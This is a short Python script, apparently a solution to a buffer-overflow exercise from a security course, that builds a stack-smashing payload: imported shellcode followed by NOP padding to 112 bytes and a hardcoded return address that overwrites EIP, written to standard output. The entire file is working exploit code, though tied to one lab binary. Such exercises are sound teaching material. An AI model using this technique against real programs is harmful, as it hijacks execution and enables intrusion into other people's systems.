import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
NOPs = (b"\x90" * (112 - len(shellcode)))
EIP = pack("<I", 0xfff68dfc)
# Launch the attack! 
payload = shellcode + NOPs + EIP
sys.stdout.buffer.write(payload)
